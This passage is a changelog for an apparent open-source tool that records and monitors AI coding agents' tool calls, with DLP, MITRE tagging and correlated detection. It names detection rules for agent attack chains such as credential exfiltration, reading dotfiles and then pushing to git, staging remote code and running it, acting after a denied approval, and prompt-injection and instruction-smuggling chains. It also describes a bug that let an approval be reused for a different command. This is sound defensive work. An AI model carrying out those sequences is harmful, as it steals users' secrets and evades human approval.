- **`fleet_id` is omitted when unset** rather than emitted as an empty string.
  An empty value on every event is noise in the trail and a trap in a SIEM,
  where `fleet_id="*"` would match unconfigured hosts. `doctor` warns when it is
  not set.
- **ECS categories are semantically correct.** `detection` maps to
  `intrusion_detection`, and `tool_denied` / `tool_failed` carry both `process`
  and `intrusion_detection`. A correlated finding filed under `process`
  disappeared among the tool calls it was raised about.
- Detection rules match on hook-side traits **or** the plaintext command, so
  correlated detection works under the default privacy configuration where no
  `tool.command` reaches the trail. Most sequence rules were previously dead on
  real traffic.
- The live-detection durability claim is scoped to what it actually covers: the
  local trail insert gates the checkpoint, so a detection re-fires after a local
  write failure. Network sink forwarding is best-effort by design and a down
  SIEM does not block the checkpoint.

## [0.2.1] - 2026-07-20

### Added
- **YAML detection manifest** (`agentmetry/policies/detection/manifest.yaml`) — tunable burst
  thresholds and analyst-authored session count rules (no Python PR).
- **Hook-side detection traits** (`tool.traits`) — command classification at the hook
  before hashing so sequence rules work with default privacy config (no `tool.command`
  in trail).
- **Enterprise lane doc** — [`docs/compliance/enterprise-lane.md`](docs/compliance/enterprise-lane.md)
  (honest limits vs optional fleet/EDR path).
- **Chinese agent capture (Sprint C).** Kimi `stream-json` print-mode ingest
  (`python scripts/agentmetry_ingest.py kimi stream-json`), `session-tool-burst`
  and `host-subagent-swarm-burst` detection rules, DashScope-specific DLP,
  host-level live detection aggregation, Trae MCP-proxy adapter stub, and
  `scripts/install_chinese_hooks.ps1` (all Chinese CLIs in one script).
- **Chinese agent capture (Sprint B).** Qoder and CodeBuddy hook adapters,
  `subagent-swarm-burst` detection rule, Chinese provider DLP (Tencent SecretId,
  API key assignments, env overrides), CN cloud CLI coverage in
  `credential-read-then-cloud-api`, extended tool policy for kimi/qwen/deepseek.
- **Chinese agent capture (Sprint A).** Qwen Code and Kimi Code Tier B hooks:
  `map_qwen_hook`, `map_kimi_hook`, `install_qwen_hooks.ps1`, `install_kimi_hooks.ps1`,
  dashboard badges, and [`docs/integrations/chinese-agents.md`](docs/integrations/chinese-agents.md).
- **Detection rules (HF July 2026 patterns).** Three sequence rules for agentic
  intrusion patterns seen in governed coding-agent sessions:
  `credential-read-then-cloud-api`, `dotfile-read-then-git-push`, and
  `remote-staging-then-execute`.
- **DLP:** Hugging Face access token pattern (`hf_…`).
- **Docs:** [`docs/compliance/local-llm-forensics.md`](docs/compliance/local-llm-forensics.md)
  — forensic playbook for analyzing JSONL trails with a self-hosted model when
  commercial APIs block incident payloads (the "asymmetry problem" from Hugging
  Face's July 2026 disclosure).

### Changed
- **Agentmetry-only scope.** Removed legacy Agentic OS / email / LangGraph docs and
  config; `agentmetry doctor` is green without demo vault; CLI `recovery` removed.
- **External ingest.** `qwen`, `kimi`, `crewai`, and `opensre` are first-class
  `source_app` values (no longer rewritten to `cursor` in canonical events).
- **MITRE credential paths:** `.docker/config.json` and `.config/gcloud` upgrade
  file reads to T1552 (Credentials In Files).

## [0.2.0] - 2026-07-19

First tagged public-alpha release. A local-first flight recorder and mini-SIEM
for AI coding agents: capture tool calls at the IDE and MCP boundary, tag them
with MITRE ATT&CK, correlate sequences into detections, and keep a
tamper-evident JSONL trail you own.

### Added
- **Capture.** IDE lifecycle hooks for Cursor, Claude Code, Codex and
  Antigravity, plus an MCP stdio audit proxy. Hooks self-install at orchestrator
  boot (`bootstrap_tier_b_hooks`), with no per-repo setup.
- **Canonical schema v1.1.0.** Typed, SIEM-ready JSON with `actor`, `initiator`,
  `model`, and a `tool` block carrying `input_hash`, `parameters_redacted`, and a
  MITRE `{tactic_id, tactic, technique_id, technique}` object.
- **Correlated detection.** Nine sequence rules (`credential-exfil`,
  `approval-denied-then-executed`, `encoded-command-download`,
  `pr-merged-without-review`, `untrusted-input-then-risky-action`,
  `destructive-delete-burst`, `autonomous-unapproved-write`,
  `discovery-then-collect`, opt-in `off-hours-activity`), including the two
  published Agent Data Injection chains ([arXiv:2607.05120](https://arxiv.org/abs/2607.05120)).
  Ordering is enforced by position, not co-occurrence. Detections stream to every
  sink as first-class events.
- **Durable live detection state.** SQLite checkpoint of emitted rules and
  session event windows, which survives an orchestrator restart without
  re-firing.
- **Local DLP.** A regex engine scanning tool arguments at the hook boundary,
  `log` (default) or `block` mode, recording the rule id and never the matched
  value. Covers cloud keys, GitHub PATs, Slack tokens, bearer headers, private
  keys, US SSN, invisible-Unicode instruction smuggling, and known supply-chain
  exfil artifacts.
- **Tool allow/deny policy.** A YAML manifest enforced at the hook boundary
  before DLP; `command_pattern` rules match across all four IDE payload shapes.
- **Pre-execution enforcement.** `block` decisions are emitted only on genuinely
  pre-execution hooks. After-hooks record the match but never deny, since the
  tool has already run.
- **JSONL hash chain.** The file sink writes tamper-evident chained envelopes;
  `agentmetry verify --trail` validates the chain, reports legacy unchained
  prefix lines separately, and prints the chain head for out-of-band recording.
- **SIEM forwarding.** File, generic webhook, Elastic ECS, Splunk HEC, Loki via
  Grafana Alloy, a Sigma pack, and an alert webhook on denied or error outcomes.
- **Dashboard (Phase 1).** A Next.js hunt layout with an Event stream, a
  Detections triage view, and Analytics (MITRE breakdown, session process tree),
  light and dark, with CSV/JSONL export.
- **Evidence.** Export packs with a SHA-256 integrity manifest; `agentmetry
  verify` recomputes it.
- **Ops CLI.** `agentmetry doctor`, `stats`, `export`, `verify`, `verify
  --trail`, and `start`/`stop`/`status`.
- **Compliance kit.** An ISO 42001 mapping and an EU AI Act deployer checklist.
- **Install.** Windows one-flow `scripts/install.ps1`. The orchestrator, tests,
  and hook bootstrap also run on Linux (CI runs on Ubuntu).

### Fixed
- Inferred approvals bind to the action that was actually approved. The matcher
  compared tool names only, so an approval for `Bash(rm -rf /tmp/x)` could be
  consumed by a later `Bash(ls)`. It now compares `input_hash` when both sides
  carry one, and a mismatch leaves the approval pending so it resolves as denied
  at session end, exposing the proposed-versus-executed gap in the trail.
- Enforcement (`block`) is emitted only on genuinely pre-execution hooks. An
  after-hook match is recorded but never turned into a deny, since the tool has
  already run.
- Live detections are written to the local trail before being checkpointed, so
  a detection is never lost to a local write failure — it re-fires on the next
  session event. Network sink forwarding (webhook, Elastic, Splunk, Loki) is
  best-effort and does not gate the checkpoint: a down SIEM logs the error and
  the local trail remains the source of truth, which is where the dashboard and
  `verify --trail` read from.
- Loki forwarding unwraps the hash-chain envelope, so the documented LogQL
  queries resolve their fields again.
- API key comparison is constant-time (`secrets.compare_digest`), so the key
  cannot be recovered a byte at a time through response timing.

### Changed
- `core/config.py` groups the SIEM recorder settings first and the optional
  governed-runtime settings separately, with a pointer to their doc. No settings
  changed: field names, defaults, and environment aliases are identical.

### Known limitations
- Approval *responses* are inferred, not observed, since no IDE reports the
  human's click. Inferred events are marked `inferred:*` and never presented as
  native.
- The MCP proxy is stdio-only; remote Streamable-HTTP servers are not yet seen.
- DLP is regex, not entropy- or ML-based.
- Tamper-evidence covers lines written after chaining was enabled, so a
  long-running trail can carry a large legacy unchained prefix. The chain
  protects the JSONL, not the SQLite index the dashboard reads.
- Agentmetry records the agents you wire in. It is not a CASB and does not see
  unmanaged ChatGPT or an IDE with hooks disabled.

[Unreleased]: https://github.com/blitzcrieg1/agentmetry/compare/v0.3.0...HEAD
[0.3.0]: https://github.com/blitzcrieg1/agentmetry/compare/v0.2.1...v0.3.0
[0.2.1]: https://github.com/blitzcrieg1/agentmetry/compare/v0.2.0...v0.2.1
[0.2.0]: https://github.com/blitzcrieg1/agentmetry/releases/tag/v0.2.0
